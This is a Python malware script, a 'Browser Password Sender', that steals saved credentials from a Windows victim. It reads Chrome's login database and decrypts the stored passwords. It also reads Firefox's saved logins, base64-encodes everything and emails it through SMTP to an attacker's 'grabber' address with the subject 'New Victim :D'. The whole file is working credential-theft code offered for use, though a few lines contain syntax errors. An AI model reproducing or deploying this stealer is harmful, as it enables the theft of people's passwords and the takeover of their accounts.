
import base64,os,sys,platform,smtplib,win32crypt,sqlite3
#Browser Password Sender version 1.0
#now send firefox(crypted) and chrome (decrypted)password
#coded by Erfan Omidfar (l3l4ck.hat@gmail.com)


def GetChromeInfo():
	db_path = os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	textResult = "Chrome information : \n"
	if os.path.exists(db_path):
		conn = sqlite3.connect(db_path)
		rows = conn.cursor().execute('SELECT action_url, username_value, password_value FROM logins').fetchall()
		if rows is None:
		   textResult += "Chrome browser not save any records ."
		else:
			for item in rows:	
				password = win32crypt.CryptUnprotectData(item[2], None, None, None, 0)[1]
				textResult += "Url : %s\t"%item[0]+ 'Login Name : %s\t'%item[1] + "Password : %s\t\n"%password 
	else:
		textResult += "Chrome Not Found"
	return textResult
	
def GetFireFoxInfo():
	temp = os.getenv('APPDATA')+"\\Mozilla\\FireFox\\Profiles\\"
	db_path = temp + os.listdir(temp)[0] + "\\signons.sqlite"
	textResult = "Firefox information : \n"
	if os.path.exists(db_path):
		conn = sqlite3.connect(db_path)
		rows = conn.cursor().execute("SELECT * FROM moz_logins").fetchall()
		if rows is None:
		   textResult += "Firefox browser not save any records ."
		else:
			for item in rows:	
				textResult +="Url : %s\t"%item[1]+ "Login Name : %s\t"%item[6]+ "Password : %s\n"%item[7]
	else:
		textResult += "Firefox Not Found"			
	return textResult


def SendMail(frm,to,subject,body,username,password):

	message = "From: target <"+ frm +">	\nTo: Grabber <"+ to +">	\nSubject: "+ subject +"  \n" + body
	server = smtplib.SMTP('yoursmtp:port')
	server.ehlo()
	server.starttls()
	server.ehlo()
	server.login(username,password)
	server.sendmail(frm, to, message)
	server.quit()
    
if __name__ == '__main__':
	mail_message = "\n\r"+GetChromeInfo()+"\n\n\r"+ GetFireFoxInfo()+"\n\n\r"+
	fromaddr = 'smtp login name'
	toaddrs = grabber mail'
	subject = "New Victim :D "
	body = base64.b64encode(mail_message)
	username = 'smtp login name'
	password = 'smtp password'
	SendMail(fromaddr,toaddrs,subject,body,username,password)


	
